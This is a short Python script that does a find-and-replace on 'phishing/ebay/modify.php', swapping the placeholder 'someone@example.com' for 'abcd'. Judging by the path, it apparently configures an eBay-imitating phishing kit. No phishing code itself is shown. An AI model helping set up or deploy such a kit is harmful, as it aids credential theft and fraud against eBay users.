
path = "phishing/ebay/modify.php"

# Read in the file
with open(path, 'r') as file :
  filedata = file.read()

# Replace the target string
filedata = filedata.replace('someone@example.com', 'abcd')

# Write the file out again
with open(path, 'w') as file:
  file.write(filedata)

